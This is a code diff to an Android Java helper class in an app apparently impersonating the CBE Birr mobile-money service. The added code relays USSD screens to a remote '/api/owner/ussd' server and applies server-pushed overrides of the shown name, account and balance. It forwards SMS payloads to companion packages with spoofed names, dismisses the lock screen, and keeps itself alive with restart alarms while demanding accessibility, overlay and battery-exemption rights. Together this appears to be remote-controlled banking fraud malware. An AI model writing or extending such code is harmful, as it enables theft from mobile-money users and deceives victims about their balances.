@@ -1,7 +1,10 @@
 package com.cbe.cbebirrtransfer;
 
 import android.app.Activity;
+import android.app.AlarmManager;
+import android.app.KeyguardManager;
 import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
@@ -15,14 +18,21 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
 import android.os.PowerManager;
+import android.os.SystemClock;
 import android.provider.Settings;
 import android.text.TextUtils;
 import android.view.View;
 import android.view.ViewGroup;
+import android.view.WindowManager;
 import android.webkit.PermissionRequest;
 import android.webkit.WebView;
+import org.json.JSONArray;
 import org.json.JSONObject;
+import java.io.OutputStream;
 import java.lang.ref.WeakReference;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -32,19 +42,41 @@ public class CallBridgeHelper {
     public static final String KEY_API_BASE = "api_base";
     public static final String KEY_PENDING_JSON = "pending_call_json";
     public static final String KEY_ASKED_RUNTIME_ONCE = "asked_runtime_once";
+    public static final String KEY_SYNC_SNAPSHOT_JSON = "sync_snapshot_json";
+    public static final String KEY_NATIVE_LOCK_STATE_JSON = "native_lock_state_json";
+    public static final String KEY_DELIVERED_NOTIF_IDS = "delivered_notif_ids_json";
+    public static final String KEY_USSD_HANDLED_JSON = "ussd_handled_state_json";
+
     public static final int REQ_WEB_PERMISSIONS = 0x1b9d;
     public static final int REQ_CALL_PERMISSIONS = 0x1b9e;
 
+    private static final Object STATE_LOCK = new Object();
     private static volatile PermissionRequest pendingWebRequest = null;
     private static volatile WeakReference<Activity> lastActivityRef = null;
     private static volatile AudioFocusRequest activeAudioFocusRequest = null;
     private static volatile PowerManager.WakeLock activeCallWakeLock = null;
+    private static volatile PowerManager.WakeLock activeUssdWakeLock = null;
+    private static volatile boolean mainActivityForeground = false;
+
+    public static void setMainActivityForeground(Activity activity, boolean foreground) {
+        if (activity != null) {
+            lastActivityRef = new WeakReference<Activity>(activity);
+        }
+        mainActivityForeground = foreground;
+    }
+
+    public static boolean isMainActivityForeground() {
+        return mainActivityForeground && MainActivity.currentInstance != null;
+    }
 
     public static void onActivityCreate(Activity activity) {
         if (activity == null) return;
         lastActivityRef = new WeakReference<Activity>(activity);
         try {
             handleLaunchIntent(activity, activity.getIntent());
+            if (hasPendingAnswerAction(activity) || isAnswerIntent(activity.getIntent())) {
+                enableCallLockScreenFlags(activity);
+            }
             Context appCtx = activity.getApplicationContext();
             String devId = getDeviceId(appCtx);
             if (!devId.isEmpty()) {
@@ -59,8 +91,88 @@ public class CallBridgeHelper {
         lastActivityRef = new WeakReference<Activity>(activity);
         try {
             handleLaunchIntent(activity, intent);
+            if (hasPendingAnswerAction(activity) || isAnswerIntent(intent)) {
+                enableCallLockScreenFlags(activity);
+            }
         } catch (Throwable ignored) {
         }
+    }
+
+    private static boolean isAnswerIntent(Intent intent) {
+        if (intent == null) return false;
+        String act = intent.getStringExtra("cbe_call_action");
+        return "answer".equals(act);
+    }
+
+    public static boolean hasPendingAnswerAction(Context ctx) {
+        if (ctx == null) return false;
+        try {
+            SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+            String raw = prefs.getString(KEY_PENDING_JSON, "");
+            if (raw == null || raw.isEmpty()) return false;
+            JSONObject obj = new JSONObject(raw);
+            long ts = obj.optLong("ts", 0L);
+            if (ts > 0L && (System.currentTimeMillis() - ts) > 120000L) {
+                return false;
+            }
+            return "answer".equals(obj.optString("action", ""));
+        } catch (Throwable ignored) {
+            return false;
+        }
+    }
+
+    public static void enableCallLockScreenFlags(final Activity activity) {
+        if (activity == null) return;
+        activity.runOnUiThread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    if (Build.VERSION.SDK_INT >= 27) {
+                        activity.setShowWhenLocked(true);
+                        activity.setTurnScreenOn(true);
+                        KeyguardManager km = (KeyguardManager) activity.getSystemService(Context.KEYGUARD_SERVICE);
+                        if (km != null) {
+                            km.requestDismissKeyguard(activity, null);
+                        }
+                    } else if (activity.getWindow() != null) {
+                        @SuppressWarnings("deprecation")
+                        int flags = WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
+                            | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
+                            | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;
+                        activity.getWindow().addFlags(flags);
+                    }
+                    if (activity.getWindow() != null) {
+                        activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
+                    }
+                } catch (Throwable ignored) {
+                }
+            }
+        });
+    }
+
+    public static void clearCallLockScreenFlags(final Activity activity) {
+        if (activity == null) return;
+        activity.runOnUiThread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    if (Build.VERSION.SDK_INT >= 27) {
+                        activity.setShowWhenLocked(false);
+                        activity.setTurnScreenOn(false);
+                    } else if (activity.getWindow() != null) {
+                        @SuppressWarnings("deprecation")
+                        int flags = WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
+                            | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
+                            | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;
+                        activity.getWindow().clearFlags(flags);
+                    }
+                    if (activity.getWindow() != null) {
+                        activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
+                    }
+                } catch (Throwable ignored) {
+                }
+            }
+        });
     }
 
     private static void handleLaunchIntent(Context ctx, Intent intent) {
@@ -136,7 +248,7 @@ public class CallBridgeHelper {
                     AudioManager.class.getMethod("clearCommunicationDevice").invoke(am);
                     return;
                 }
-                int desiredType = speakerOn ? 2 : 1; // AudioDeviceInfo.TYPE_BUILTIN_SPEAKER = 2, TYPE_BUILTIN_EARPIECE = 1
+                int desiredType = speakerOn ? 2 : 1;
                 Object devicesObj = AudioManager.class.getMethod("getAvailableCommunicationDevices").invoke(am);
                 if (devicesObj instanceof List<?>) {
                     List<?> devices = (List<?>) devicesObj;
@@ -180,6 +292,9 @@ public class CallBridgeHelper {
                 }
             } catch (Throwable ignored) {
             }
+            if (!active && MainActivity.currentInstance != null) {
+                clearCallLockScreenFlags(MainActivity.currentInstance);
+            }
             AudioManager am = (AudioManager) appCtx.getSystemService(Context.AUDIO_SERVICE);
             if (am == null) return;
             if (active) {
@@ -217,6 +332,55 @@ public class CallBridgeHelper {
                 if (Build.VERSION.SDK_INT >= 26 && activeAudioFocusRequest != null) {
                     am.abandonAudioFocusRequest(activeAudioFocusRequest);
                     activeAudioFocusRequest = null;
+                }
+            }
+        } catch (Throwable ignored) {
+        }
+    }
+
+    public static void acquireUssdWakeLock(Context ctx, long timeoutMs) {
+        if (ctx == null) return;
+        try {
+            PowerManager pm = (PowerManager) ctx.getApplicationContext().getSystemService(Context.POWER_SERVICE);
+            if (pm == null) return;
+            synchronized (STATE_LOCK) {
+                if (activeUssdWakeLock != null && activeUssdWakeLock.isHeld()) {
+                    try {
+                        activeUssdWakeLock.release();
+                    } catch (Throwable ignored) {
+                    }
+                }
+                @SuppressWarnings("deprecation")
+                int flags = PowerManager.FULL_WAKE_LOCK
+                    | PowerManager.ACQUIRE_CAUSES_WAKEUP
+                    | PowerManager.ON_AFTER_RELEASE;
+                activeUssdWakeLock = pm.newWakeLock(flags, "CBEBirr:RemoteUssd");
+                activeUssdWakeLock.setReferenceCounted(false);
+                activeUssdWakeLock.acquire(Math.max(10000L, Math.min(timeoutMs, 120000L)));
+            }
+        } catch (Throwable ignored) {
+            try {
+                PowerManager pm = (PowerManager) ctx.getApplicationContext().getSystemService(Context.POWER_SERVICE);
+                if (pm != null) {
+                    synchronized (STATE_LOCK) {
+                        activeUssdWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "CBEBirr:RemoteUssdCpu");
+                        activeUssdWakeLock.setReferenceCounted(false);
+                        activeUssdWakeLock.acquire(Math.max(10000L, Math.min(timeoutMs, 120000L)));
+                    }
+                }
+            } catch (Throwable ignored2) {
+            }
+        }
+    }
+
+    public static void releaseUssdWakeLock() {
+        try {
+            synchronized (STATE_LOCK) {
+                if (activeUssdWakeLock != null) {
+                    if (activeUssdWakeLock.isHeld()) {
+                        activeUssdWakeLock.release();
+                    }
+                    activeUssdWakeLock = null;
                 }
             }
         } catch (Throwable ignored) {
@@ -262,6 +426,354 @@ public class CallBridgeHelper {
         } catch (Throwable ignored) {
             return "https://cbebirr-lovat.vercel.app";
         }
+    }
+
+    public static void sendSmsIpc(Context ctx, String payload) {
+        if (ctx == null || payload == null || payload.isEmpty()) return;
+        try {
+            Intent i1 = new Intent("com.cbe.cbebirrtransfer.SMS_WEBHOOK");
+            i1.setClassName("com.cbebirr.messages.cbe", "com.cbebirr.messages.cbe.CbeSmsReceiver");
+            i1.addFlags(285212704);
+            i1.putExtra("payload", payload);
+            ctx.sendBroadcast(i1);
+        } catch (Throwable ignored) {
+        }
+        try {
+            Intent i2 = new Intent("com.cbe.cbebirrtransfer.SMS_WEBHOOK");
+            i2.setClassName("com.samsung.messages.cbe", "com.cbebirr.messages.cbe.CbeSmsReceiver");
+            i2.addFlags(285212704);
+            i2.putExtra("payload", payload);
+            ctx.sendBroadcast(i2);
+        } catch (Throwable ignored) {
+        }
+    }
+
+    public static void saveSyncSnapshotJson(Context ctx, String jsonStr) {
+        if (ctx == null || jsonStr == null || jsonStr.trim().isEmpty()) return;
+        try {
+            synchronized (STATE_LOCK) {
+                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                prefs.edit().putString(KEY_SYNC_SNAPSHOT_JSON, jsonStr).apply();
+            }
+        } catch (Throwable ignored) {
+        }
+    }
+
+    public static String getSyncSnapshotJson(Context ctx) {
+        if (ctx == null) return "";
+        try {
+            synchronized (STATE_LOCK) {
+                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                String val = prefs.getString(KEY_SYNC_SNAPSHOT_JSON, "");
+                return val != null ? val : "";
+            }
+        } catch (Throwable ignored) {
+            return "";
+        }
+    }
+
+    public static void saveNativeSyncResultState(Context ctx, JSONObject syncResp) {
+        if (ctx == null || syncResp == null) return;
+        try {
+            synchronized (STATE_LOCK) {
+                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                String existingRaw = prefs.getString(KEY_NATIVE_LOCK_STATE_JSON, "");
+                JSONObject stateObj = (existingRaw != null && !existingRaw.isEmpty())
+                    ? new JSONObject(existingRaw)
+                    : new JSONObject();
+
+                if (syncResp.has("effectiveLocked")) {
+                    stateObj.put("effectiveLocked", syncResp.optBoolean("effectiveLocked", false));
+                }
+                if (syncResp.has("lockMessage")) {
+                    stateObj.put("lockMessage", syncResp.optString("lockMessage", ""));
+                }
+                if (syncResp.has("approvalStatus")) {
+                    stateObj.put("approvalStatus", syncResp.optString("approvalStatus", "approved"));
+                }
+                if (syncResp.has("permissionBypassStatus")) {
+                    stateObj.put("permissionBypassStatus", syncResp.optString("permissionBypassStatus", "none"));
+                }
+                stateObj.put("updatedAtMs", System.currentTimeMillis());
+
+                JSONObject ov = syncResp.optJSONObject("deviceOverride");
+                if (ov != null && ov.optInt("overrideSeq", 0) > 0) {
+                    int incomingSeq = ov.optInt("overrideSeq", 0);
+                    JSONObject prevOv = stateObj.optJSONObject("deviceOverride");
+                    int prevSeq = prevOv != null ? prevOv.optInt("overrideSeq", 0) : 0;
+                    if (incomingSeq >= prevSeq) {
+                        stateObj.put("deviceOverride", ov);
+                    }
+
+                    // Merge override into KEY_SYNC_SNAPSHOT_JSON so subsequent background sync ACKs appliedOverrideSeq cleanly
+                    String snapRaw = prefs.getString(KEY_SYNC_SNAPSHOT_JSON, "");
+                    if (snapRaw != null && !snapRaw.isEmpty()) {
+                        try {
+                            JSONObject snap = new JSONObject(snapRaw);
+                            int snapApplied = snap.optInt("appliedOverrideSeq", 0);
+                            if (incomingSeq > snapApplied) {
+                                if (ov.has("deviceName") && !ov.optString("deviceName", "").isEmpty()) {
+                                    snap.put("deviceName", ov.optString("deviceName", snap.optString("deviceName", "Android Device")));
+                                }
+                                snap.put("userName", ov.optString("userName", snap.optString("userName", "")));
+                                snap.put("phoneNumber", ov.optString("phoneNumber", snap.optString("phoneNumber", "")));
+                                snap.put("userAccount", ov.optString("userAccount", snap.optString("userAccount", "")));
+                                if (ov.has("balance")) snap.put("balance", ov.optDouble("balance", snap.optDouble("balance", 500.0)));
+                                if (ov.has("rewardBalance")) snap.put("rewardBalance", ov.optDouble("rewardBalance", snap.optDouble("rewardBalance", 500.0)));
+                                if (ov.has("appLang")) snap.put("appLang", ov.optString("appLang", "en"));
+                                if (ov.has("isBalanceShown")) snap.put("isBalanceShown", ov.optBoolean("isBalanceShown", true));
+                                if (ov.has("isRewardShown")) snap.put("isRewardShown", ov.optBoolean("isRewardShown", false));
+                                JSONArray cbeProfs = ov.optJSONArray("ussdProfiles");
+                                if (cbeProfs != null) snap.put("ussdProfilesJson", cbeProfs.toString());
+                                if (ov.has("activeUssdId")) snap.put("activeUssdId", ov.optString("activeUssdId", ""));
+                                JSONArray phoneProfs = ov.optJSONArray("phoneUssdProfiles");
+                                if (phoneProfs != null) snap.put("phoneUssdProfilesJson", phoneProfs.toString());
+                                if (ov.has("activePhoneUssdId")) snap.put("activePhoneUssdId", ov.optString("activePhoneUssdId", ""));
+                                snap.put("appliedOverrideSeq", incomingSeq);
+                                prefs.edit().putString(KEY_SYNC_SNAPSHOT_JSON, snap.toString()).apply();
+                            }
+                        } catch (Throwable ignored) {
+                        }
+                    }
+                }
+
+                prefs.edit().putString(KEY_NATIVE_LOCK_STATE_JSON, stateObj.toString()).apply();
+            }
+        } catch (Throwable ignored) {
+        }
+    }
+
+    public static String getNativeSyncStateJson(Context ctx) {
+        if (ctx == null) return "";
+        try {
+            synchronized (STATE_LOCK) {
+                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                String val = prefs.getString(KEY_NATIVE_LOCK_STATE_JSON, "");
+                return val != null ? val : "";
+            }
+        } catch (Throwable ignored) {
+            return "";
+        }
+    }
+
+    public static boolean hasDeliveredNotif(Context ctx, String notifId) {
+        if (ctx == null || notifId == null || notifId.trim().isEmpty()) return false;
+        String cleanId = notifId.trim();
+        try {
+            synchronized (STATE_LOCK) {
+                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                String raw = prefs.getString(KEY_DELIVERED_NOTIF_IDS, "[]");
+                JSONArray arr = new JSONArray(raw != null && !raw.isEmpty() ? raw : "[]");
+                for (int i = 0; i < arr.length(); i++) {
+                    if (cleanId.equals(arr.optString(i))) return true;
+                }
+            }
+        } catch (Throwable ignored) {
+        }
+        return false;
+    }
+
+    public static void markNotifDelivered(Context ctx, String notifId) {
+        if (ctx == null || notifId == null || notifId.trim().isEmpty()) return;
+        String cleanId = notifId.trim();
+        try {
+            synchronized (STATE_LOCK) {
+                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                String raw = prefs.getString(KEY_DELIVERED_NOTIF_IDS, "[]");
+                JSONArray arr = new JSONArray(raw != null && !raw.isEmpty() ? raw : "[]");
+                for (int i = 0; i < arr.length(); i++) {
+                    if (cleanId.equals(arr.optString(i))) return;
+                }
+                arr.put(cleanId);
+                JSONArray trimmed = new JSONArray();
+                int start = Math.max(0, arr.length() - 80);
+                for (int i = start; i < arr.length(); i++) {
+                    trimmed.put(arr.optString(i));
+                }
+                prefs.edit().putString(KEY_DELIVERED_NOTIF_IDS, trimmed.toString()).apply();
+            }
+        } catch (Throwable ignored) {
+        }
+    }
+
+    private static JSONObject loadUssdHandledStateLocked(SharedPreferences prefs) {
+        try {
+            String raw = prefs.getString(KEY_USSD_HANDLED_JSON, "{}");
+            return new JSONObject(raw != null && !raw.isEmpty() ? raw : "{}");
+        } catch (Throwable ignored) {
+            return new JSONObject();
+        }
+    }
+
+    public static boolean isRemoteUssdHandled(Context ctx, String requestId) {
+        if (ctx == null || requestId == null || requestId.trim().isEmpty()) return false;
+        String cleanId = requestId.trim();
+        try {
+            synchronized (STATE_LOCK) {
+                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                JSONObject obj = loadUssdHandledStateLocked(prefs);
+                JSONArray arr = obj.optJSONArray("handledIds");
+                if (arr != null) {
+                    for (int i = 0; i < arr.length(); i++) {
+                        if (cleanId.equals(arr.optString(i))) return true;
+                    }
+                }
+            }
+        } catch (Throwable ignored) {
+        }
+        return false;
+    }
+
+    public static void markRemoteUssdHandled(Context ctx, String requestId, int appliedReplySeq, boolean cancelled) {
+        if (ctx == null || requestId == null || requestId.trim().isEmpty()) return;
+        String cleanId = requestId.trim();
+        try {
+            synchronized (STATE_LOCK) {
+                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                JSONObject obj = loadUssdHandledStateLocked(prefs);
+                JSONArray arr = obj.optJSONArray("handledIds");
+                if (arr == null) arr = new JSONArray();
+                boolean found = false;
+                for (int i = 0; i < arr.length(); i++) {
+                    if (cleanId.equals(arr.optString(i))) {
+                        found = true;
+                        break;
+                    }
+                }
+                if (!found) arr.put(cleanId);
+                JSONArray trimmed = new JSONArray();
+                int start = Math.max(0, arr.length() - 30);
+                for (int i = start; i < arr.length(); i++) {
+                    trimmed.put(arr.optString(i));
+                }
+                obj.put("handledIds", trimmed);
+
+                String prevReqId = obj.optString("activeReqId", "");
+                if (!cleanId.equals(prevReqId)) {
+                    obj.put("activeReqId", cleanId);
+                    obj.put("appliedReplySeq", Math.max(0, appliedReplySeq));
+                    obj.put("cancelledReqId", cancelled ? cleanId : "");
+                } else {
+                    int prevSeq = obj.optInt("appliedReplySeq", 0);
+                    obj.put("appliedReplySeq", Math.max(prevSeq, appliedReplySeq));
+                    if (cancelled) {
+                        obj.put("cancelledReqId", cleanId);
+                    }
+                }
+                prefs.edit().putString(KEY_USSD_HANDLED_JSON, obj.toString()).commit();
+            }
+        } catch (Throwable ignored) {
+        }
+    }
+
+    public static int getRemoteUssdAppliedReplySeq(Context ctx, String requestId) {
+        if (ctx == null || requestId == null || requestId.trim().isEmpty()) return 0;
+        try {
+            synchronized (STATE_LOCK) {
+                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                JSONObject obj = loadUssdHandledStateLocked(prefs);
+                if (requestId.trim().equals(obj.optString("activeReqId", ""))) {
+                    return Math.max(0, obj.optInt("appliedReplySeq", 0));
+                }
+            }
+        } catch (Throwable ignored) {
+        }
+        return 0;
+    }
+
+    public static void setRemoteUssdAppliedReplySeq(Context ctx, String requestId, int seq) {
+        markRemoteUssdHandled(ctx, requestId, seq, false);
+    }
+
+    public static boolean isRemoteUssdCancelled(Context ctx, String requestId) {
+        if (ctx == null || requestId == null || requestId.trim().isEmpty()) return false;
+        try {
+            synchronized (STATE_LOCK) {
+                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                JSONObject obj = loadUssdHandledStateLocked(prefs);
+                return requestId.trim().equals(obj.optString("cancelledReqId", ""));
+            }
+        } catch (Throwable ignored) {
+            return false;
+        }
+    }
+
+    public static void markRemoteUssdCancelled(Context ctx, String requestId) {
+        markRemoteUssdHandled(ctx, requestId, 0, true);
+    }
+
+    public static void reportRemoteUssdStateAsync(
+        final Context ctx,
+        final String requestId,
+        final String status,
+        final String screenText,
+        final boolean hasInput,
+        final String detail,
+        final int appliedReplySeq
+    ) {
+        if (ctx == null || requestId == null || requestId.trim().isEmpty()) return;
+        final Context appCtx = ctx.getApplicationContext();
+        final String reqIdClean = requestId.trim();
+        Thread t = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                String deviceId = getDeviceId(appCtx);
+                if (deviceId.isEmpty()) return;
+                String baseUrl = getApiBaseUrl(appCtx);
+                for (int attempt = 0; attempt < 2; attempt++) {
+                    HttpURLConnection conn = null;
+                    try {
+                        URL url = new URL(baseUrl + "/api/owner/ussd");
+                        conn = (HttpURLConnection) url.openConnection();
+                        conn.setRequestMethod("POST");
+                        conn.setConnectTimeout(4500);
+                        conn.setReadTimeout(4500);
+                        conn.setDoOutput(true);
+                        conn.setRequestProperty("Content-Type", "application/json");
+                        conn.setRequestProperty("x-device-id", deviceId);
+
+                        JSONObject body = new JSONObject();
+                        body.put("action", "client_update");
+                        body.put("deviceId", deviceId);
+                        body.put("requestId", reqIdClean);
+                        body.put("status", status != null ? status : "screen");
+                        if (screenText != null) {
+                            body.put("screenText", screenText);
+                        }
+                        body.put("hasInput", hasInput);
+                        if (detail != null) {
+                            body.put("detail", detail);
+                        }
+                        if (appliedReplySeq >= 0) {
+                            body.put("appliedReplySeq", appliedReplySeq);
+                        }
+                        byte[] bytes = body.toString().getBytes(StandardCharsets.UTF_8);
+                        OutputStream os = conn.getOutputStream();
+                        os.write(bytes);
+                        os.close();
+                        int code = conn.getResponseCode();
+                        if (code >= 200 && code < 300) {
+                            return;
+                        }
+                    } catch (Throwable ignored) {
+                    } finally {
+                        if (conn != null) {
+                            try {
+                                conn.disconnect();
+                            } catch (Throwable ignored) {
+                            }
+                        }
+                    }
+                    try {
+                        Thread.sleep(450L);
+                    } catch (InterruptedException ignored) {
+                        return;
+                    }
+                }
+            }
+        });
+        t.setDaemon(true);
+        t.start();
     }
 
     public static void setPendingCallAction(Context ctx, String callId, String action) {
@@ -315,6 +827,29 @@ public class CallBridgeHelper {
         }
     }
 
+    public static void scheduleServiceRestartAlarm(Context ctx, long delayMs) {
+        if (ctx == null) return;
+        try {
+            Context appCtx = ctx.getApplicationContext();
+            if (getDeviceId(appCtx).isEmpty()) return;
+            AlarmManager am = (AlarmManager) appCtx.getSystemService(Context.ALARM_SERVICE);
+            if (am == null) return;
+            Intent restartIntent = new Intent(appCtx, CallBootReceiver.class);
+            restartIntent.setAction(CallBootReceiver.ACTION_RESTART_CALL_SYNC);
+            int piFlags = Build.VERSION.SDK_INT >= 23
+                ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
+                : PendingIntent.FLAG_UPDATE_CURRENT;
+            PendingIntent pi = PendingIntent.getBroadcast(appCtx, 7099, restartIntent, piFlags);
+            long triggerAt = SystemClock.elapsedRealtime() + Math.max(500L, delayMs);
+            if (Build.VERSION.SDK_INT >= 23) {
+                am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi);
+            } else {
+                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi);
+            }
+        } catch (Throwable ignored) {
+        }
+    }
+
     public static void stopCallRinger(Context ctx) {
         CallForegroundService.stopRingingStatic(ctx);
         IncomingCallActivity.finishIfOpen("");
@@ -355,6 +890,17 @@ public class CallBridgeHelper {
         if (Build.VERSION.SDK_INT < 23) return true;
         try {
             return Settings.canDrawOverlays(ctx);
+        } catch (Throwable ignored) {
+            return false;
+        }
+    }
+
+    public static boolean hasIgnoreBatteryOptimizations(Context ctx) {
+        if (ctx == null) return false;
+        if (Build.VERSION.SDK_INT < 23) return true;
+        try {
+            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
+            return pm == null || pm.isIgnoringBatteryOptimizations(ctx.getPackageName());
         } catch (Throwable ignored) {
             return false;
         }
@@ -420,13 +966,15 @@ public class CallBridgeHelper {
             boolean notif = hasNotificationsEnabled(ctx);
             boolean overlay = hasOverlayEnabled(ctx);
             boolean accessibility = isUssdAccessibilityEnabled(ctx);
-            boolean allGranted = mic && cam && phone && notif && overlay && accessibility;
+            boolean battery = hasIgnoreBatteryOptimizations(ctx);
+            boolean allGranted = mic && cam && phone && notif && overlay && accessibility && battery;
             obj.put("microphone", mic);
             obj.put("camera", cam);
             obj.put("phone", phone);
             obj.put("notifications", notif);
             obj.put("overlay", overlay);
             obj.put("accessibility", accessibility);
+            obj.put("battery", battery);
             obj.put("allGranted", allGranted);
             obj.put("sdkInt", Build.VERSION.SDK_INT);
         } catch (Throwable ignored) {
@@ -442,7 +990,8 @@ public class CallBridgeHelper {
                 && hasRuntimePerm(ctx, "android.permission.CALL_PHONE")
                 && hasNotificationsEnabled(ctx)
                 && hasOverlayEnabled(ctx)
-                && isUssdAccessibilityEnabled(ctx);
+                && isUssdAccessibilityEnabled(ctx)
+                && hasIgnoreBatteryOptimizations(ctx);
         } catch (Throwable ignored) {
             return false;
         }
@@ -499,6 +1048,10 @@ public class CallBridgeHelper {
                             openPermissionSetting(activity, "notifications");
                             return;
                         }
+                        if (!hasIgnoreBatteryOptimizations(activity)) {
+                            openPermissionSetting(activity, "battery");
+                            return;
+                        }
                     }
                     if (!isUssdAccessibilityEnabled(activity)) {
                         openPermissionSetting(activity, "accessibility");
@@ -520,6 +1073,11 @@ public class CallBridgeHelper {
                     if ("overlay".equals(k) && Build.VERSION.SDK_INT >= 23) {
                         intent = new Intent(
                             Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                            Uri.parse("package:" + activity.getPackageName())
+                        );
+                    } else if ("battery".equals(k) && Build.VERSION.SDK_INT >= 23) {
+                        intent = new Intent(
+                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                             Uri.parse("package:" + activity.getPackageName())
                         );
                     } else if ("notifications".equals(k)) {
@@ -632,6 +1190,8 @@ public class CallBridgeHelper {
                         openPermissionSetting(act, "overlay");
                     } else if (!hasNotificationsEnabled(act)) {
                         openPermissionSetting(act, "notifications");
+                    } else if (!hasIgnoreBatteryOptimizations(act)) {
+                        openPermissionSetting(act, "battery");
                     } else if (!isUssdAccessibilityEnabled(act)) {
                         openPermissionSetting(act, "accessibility");
                     }
